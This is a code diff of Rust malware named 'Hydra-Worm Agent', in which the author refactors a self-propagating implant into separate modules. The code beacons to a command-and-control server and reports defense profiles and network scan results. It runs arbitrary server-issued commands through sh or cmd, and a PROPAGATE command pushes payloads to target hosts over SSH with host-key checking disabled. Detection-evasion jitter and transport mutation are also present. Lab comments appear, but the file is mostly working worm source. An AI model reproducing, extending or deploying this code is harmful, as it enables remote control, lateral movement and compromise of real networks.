@@ -1,6 +1,8 @@
 // Project: Hydra-Worm Agent
+// Integrity Status: MODULAR_CONSOLIDATION_MOD
+
 use std::process::Command;
-use std::net::ToSocketAddrs; // Required for runtime hostname resolution
+use std::net::ToSocketAddrs; 
 use std::{thread, time::Duration, net::UdpSocket};
 use rand::Rng;
 use rand::seq::SliceRandom;
@@ -12,6 +14,15 @@ use sysinfo::System;
 use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
 use pnet::packet::icmp::IcmpTypes; 
 use pnet::packet::Packet;
+
+// --- EXTERNAL MODULE LINKAGE ---
+mod recon;   // Links to src/recon/mod.rs (This is working)
+
+#[path = "engine/modE.rs"]
+mod engine;  // Explicitly maps the module to your renamed file
+
+use crate::recon::NetworkScanner;
+use crate::engine::InfectionEngine;
 
 // --- PHASE 3.3: TACTICAL LOOT SCRAPER ---
 struct LootScraper;
@@ -52,6 +63,7 @@ struct Telemetry {
     #[serde(rename = "e")] env_context: String,
     #[serde(rename = "p")] artifact_preview: String,
     #[serde(rename = "d")] defense_profile: String,
+    #[serde(rename = "v")] scan_results: String,
 }
 
 #[derive(Deserialize)]
@@ -308,36 +320,6 @@ impl Transport for P2PTransport {
     fn get_name(&self) -> String { "P2P-Gossip-Mesh".into() }
 }
 
-// --- PHASE 3.5: INFECTION ENGINE (LATERAL MOVEMENT) ---
-struct InfectionEngine;
-
-impl InfectionEngine {
-    fn execute_pivot(target_ip: &str, payload_cmd: &str) {
-        let target = target_ip.to_string();
-        let payload = payload_cmd.to_string();
-
-        thread::spawn(move || {
-            println!("[!] PIVOT_ENGAGED > Targeting node: {}", target);
-            // SSH pivot using harvested keys/access from the lab environment
-            // In the lab, we bypass host key verification for seamless propagation
-            let status = Command::new("sh")
-                .arg("-c")
-                .arg(format!(
-                    "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {} '{}'", 
-                    target, 
-                    payload
-                ))
-                .status();
-
-            match status {
-                Ok(s) if s.success() => println!("[+] SUCCESS > Payload deployed to {}", target),
-                Ok(s) => println!("[?] STAGE_2_REQUIRED > SSH connected but returned exit code: {}", s),
-                Err(e) => println!("[!] PIVOT_FAILED > Connection to {} failed: {}", target, e),
-            }
-        });
-    }
-}
-
 struct Agent {
     id: String,
     transport: Box<dyn Transport>,
@@ -345,7 +327,6 @@ struct Agent {
     state: u8,
     lambda: f64,
     last_command_output: String,
-    // --- PHASE 3.4 STORAGE ---
     neighbors: Vec<String>,
     cycle_count: u64,
 }
@@ -374,7 +355,7 @@ impl Agent {
             }),
             failures: 0,
             state: 0,
-            lambda: 0.2, // Base frequency for jitter
+            lambda: 0.2, 
             last_command_output: String::new(),
             neighbors: Vec::new(),
             cycle_count: 0,
@@ -400,13 +381,15 @@ impl Agent {
         let env_ctx = detect_env();
 
         loop {
-            // --- PHASE 3.4: P2P MESH REFRESH ---
+            // --- MODULAR RECONNAISSANCE ---
+            // Triggers internal ARP/Route scraping from network.rs
+            let neighbors_detected = NetworkScanner::get_discovery_payload();
+            
             if self.cycle_count % 5 == 0 {
                 self.refresh_mesh();
             }
             self.cycle_count += 1;
 
-            // --- PHASE 3.3 PRIORITY LOGIC ---
             let artifact_data = if !self.last_command_output.is_empty() {
                 let out = self.last_command_output.clone();
                 self.last_command_output.clear();
@@ -418,6 +401,7 @@ impl Agent {
             };
 
             let defense_ctx = profile_defenses(); 
+            
             let stats = Telemetry {
                 agent_id: self.id.clone(),
                 transport: self.transport.get_name(),
@@ -429,9 +413,9 @@ impl Agent {
                 env_context: env_ctx.clone(),
                 artifact_preview: artifact_data,
                 defense_profile: defense_ctx.clone(), 
+                scan_results: neighbors_detected, 
             };
 
-            // --- HEARTBEAT & COMMAND EXECUTION ---
             match self.transport.send_heartbeat(&stats) {
                 Ok(res) => {
                     println!("[+] C2 Status: {} | Defense: {} | Activity: {}", res.status, stats.defense_profile, stats.artifact_preview);
@@ -440,32 +424,46 @@ impl Agent {
                     if res.task != "WAIT" && res.task != "NOP" && res.task != "SLEEP" && !res.task.is_empty() {
                         let parts: Vec<&str> = res.task.split_whitespace().collect();
                         
-                        // PHASE 3.5: Infection Routing
-                        if parts[0] == "PROPAGATE" && parts.len() >= 3 {
-                            let target_ip = parts[1];
-                            let payload = parts[2..].join(" ");
-                            InfectionEngine::execute_pivot(target_ip, &payload);
-                            self.last_command_output = format!("INFECTING:{}", target_ip);
-                        } else {
-                            // Standard RCE Logic
-                            let output = if cfg!(target_os = "windows") {
-                                Command::new("cmd").args(["/C", &res.task]).output()
-                            } else {
-                                Command::new("sh").args(["-c", &res.task]).output()
-                            };
+                        // --- INTEGRATED TASK ROUTER ---
+                        match parts[0] {
+                            // 1. Internal Module Trigger: Discovery
+                            "discovery" => {
+                                // Re-run discovery payload generation to ensure ARP table is fresh
+                                let _ = NetworkScanner::get_discovery_payload();
+                                self.last_command_output = "OUT: Discovery sequence complete.".to_string();
+                            },
 
-                            match output {
-                                Ok(out) => {
-                                    let stdout = String::from_utf8_lossy(&out.stdout).trim().to_string();
-                                    let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
-                                    if !stdout.is_empty() {
-                                        self.last_command_output = format!("OUT:{}", if stdout.len() > 50 { format!("{}...", &stdout[..47]) } else { stdout });
-                                    } else if !stderr.is_empty() {
-                                        self.last_command_output = format!("OUT:ERR: {}", stderr);
+                            // 2. Internal Module Trigger: Propagate
+                            "PROPAGATE" if parts.len() >= 3 => {
+                                let target_ip = parts[1];
+                                let payload = parts[2..].join(" ");
+                                let os_type = if target_ip.contains("10.5.0") { "linux" } else { "windows" };
+                                InfectionEngine::deploy(target_ip, os_type, &payload);
+                                self.last_command_output = format!("OUT:INFECTING:{}", target_ip);
+                            },
+
+                            // 3. Fallback: Standard OS Shell Execution
+                            _ => {
+                                let output = if cfg!(target_os = "windows") {
+                                    Command::new("cmd").args(["/C", &res.task]).output()
+                                } else {
+                                    Command::new("sh").args(["-c", &res.task]).output()
+                                };
+
+                                match output {
+                                    Ok(out) => {
+                                        let stdout = String::from_utf8_lossy(&out.stdout).trim().to_string();
+                                        let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
+                                        if !stdout.is_empty() {
+                                            let trimmed = if stdout.len() > 100 { format!("{}...", &stdout[..97]) } else { stdout };
+                                            self.last_command_output = format!("OUT:{}", trimmed);
+                                        } else if !stderr.is_empty() {
+                                            self.last_command_output = format!("OUT:ERR: {}", stderr);
+                                        }
                                     }
-                                }
-                                Err(e) => {
-                                    self.last_command_output = format!("OUT:EXEC_FAIL: {}", e);
+                                    Err(e) => {
+                                        self.last_command_output = format!("OUT:EXEC_FAIL: {}", e);
+                                    }
                                 }
                             }
                         }
@@ -474,14 +472,13 @@ impl Agent {
                 Err(e) => {
                     println!("[-] Failure ({}): {}", self.transport.get_name(), e);
                     self.failures += 1;
-                    if self.transport.get_name() == "ICMP-Failsafe" || self.failures >= 3 {
+                    if self.failures >= 3 {
                         self.mutate();
                         continue; 
                     }
                 }
             }
 
-            // --- ADAPTIVE JITTER SLEEP ---
             let mut rng = rand::thread_rng();
             let mut current_lambda = self.lambda;
             if defense_ctx != "None" { current_lambda /= 2.0; }
@@ -560,7 +557,7 @@ fn display_splash() {
   |__/|__/\____/_/ .__/_/ /_/ /_/                 
                 /_/                              
     "#);
-    println!("      [ Phase 3.3: Credential Management - Looting Vault Engaged ]\n");
+    println!("      [ Phase 3.5: Modular Recon & Multi-OS Pivot Engaged ]\n");
 }
 
 fn main() {
